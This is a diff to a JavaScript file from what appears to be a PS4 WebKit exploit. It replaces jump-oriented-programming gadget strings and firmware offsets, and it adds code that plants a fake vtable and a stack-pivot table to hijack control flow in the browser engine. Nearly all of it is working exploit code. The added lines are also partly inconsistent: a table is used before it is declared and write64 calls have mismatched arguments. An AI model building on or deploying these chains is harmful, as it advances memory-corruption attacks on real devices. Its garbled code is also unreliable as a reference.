@@ -41,37 +41,36 @@ export let libkernel_base = null;
 // libSceLibcInternal.sprx
 export let libc_base = null;
 
-// TODO: gadgets for the JOP chain
-//
-// we'll use JSC::CustomGetterSetter.m_setter to redirect execution. its
-// type is PutPropertySlot::PutValueFunc
- 
- const jop1 = `
-mov rdi, qword ptr [rsi + 8]
+const ta_jop1 = `
+mov rdi, qword ptr [rsi + 0x18]
 mov rax, qword ptr [rdi]
-call qword ptr [rax + 0x20]
+call qword ptr [rax + 0xb8]
 `;
-
+const ta_jop2 = `
+pop rsi
+jmp qword ptr [rax + 0x1c]
+`;
+const ta_jop3 = `
+mov rdi, qword ptr [rax + 8]
+mov rax, qword ptr [rdi]
+jmp qword ptr [rax + 0x30]
+`;
 
 const jop2 = `
 push rbp
 mov rbp, rsp
 mov rax, qword ptr [rdi]
-call qword ptr [rax + 0x20]
+call qword ptr [rax + 0x58]
 `;
 const jop3 = `
-mov rdx, r15
-mov rax, [rdi]
-call [rax + 0x10]
+mov rdx, qword ptr [rax + 0x18]
+mov rax, qword ptr [rdi]
+call qword ptr [rax + 0x10]
 `;
-const jop4 = [
-  0x00000000006707e9,   // pop rdx ; pop rcx ; ret
-  0xdeadbeefdeadbeef,   // dummy rdx
-  0x0000000000abcdef,   // indirizzo dove scrivi 0xac9784fe
-  0x000000000092c53a,   // push rdx ; mov edi, dword ptr [rcx] ; jmp ...
-  0x000000000000d19a    // jmp qword ptr [rax]
-];
-
+const jop4 = `
+push rdx
+jmp qword ptr [rax]
+`;
 const jop5 = 'pop rsp; ret';
 
 // the ps4 firmware is compiled to use rbp as a frame pointer
@@ -116,11 +115,14 @@ const webkit_gadget_offsets = new Map(Object.entries({
     'mov dword ptr [rdi], eax; ret' : 0x000000000000613c, // `89 07 c3`
     'mov dword ptr [rax], esi; ret' : 0x00000000005c3482, // `89 30 c3`
 
-    [jop1] : 0x0000000001ef2ec1, // firmware 900
-    [jop2] : 0x000000000141d420, // firmware 900
-    [jop3] : 0x000000000049e109, // ``
-   // [jop4] : 0x0000000000000000, // ``
-    [jop5] : 0x000000000004E293, // `5c c3` // 900
+    [jop2] : 0x0000000000683800,
+    [jop3] : 0x0000000000303906,
+    [jop4] : 0x00000000028bd332,
+    [jop5] : 0x000000000004e293,
+
+    [ta_jop1] : 0x00000000004e62a4,
+    [ta_jop2] : 0x00000000021fce7e,
+    [ta_jop3] : 0x00000000019becb4,
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
@@ -244,20 +246,29 @@ export function init(Chain) {
     // replace .launch with the actual custom getter/setter
     mem.addrof(_rop).write64(off.js_inline_prop, gc_buf);
     proto._rop = _rop;
+	
+	   const vtable = new Uint8Array(0x200);
+        const old_vtable_p = webcore_ta.readp(0);
+        this.vtable = vtable;
+        this.old_vtable_p = old_vtable_p;
+
+        // 0x1b8 is the offset of the scrollLeft getter native function
+        rax_ptrs.write64(vtable, 0x1b8, this.get_gadget(ta_jop1));
+        rax_ptrs.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
+        rax_ptrs.write64(vtable, 0x1c, this.get_gadget(ta_jop3));
 
     // JOP table
     const rax_ptrs = new BufferView(0x100);
     const rax_ptrs_p = get_view_vector(rax_ptrs);
     proto._rax_ptrs = rax_ptrs;
 
-    rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
-    rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
-   // rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
-    for (const gadget of jop4) {
-        chain.push_gadget(gadget);
-    }
-   
-    rax_ptrs.write64(0, get_gadget(gadgets, jop5));
+         rax_ptrs.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
+         rax_ptrs.write64(rax_ptrs, 0x58, this.get_gadget(jop3));
+         rax_ptrs.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
+         rax_ptrs.write64(rax_ptrs, 0, this.get_gadget(jop5));
+        // value to pivot rsp to
+         rax_ptrs.write64(this.rax_ptrs, 0x18, this.stack_addr);
+
 
     const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
     jop_buffer_p.write64(0, rax_ptrs_p);
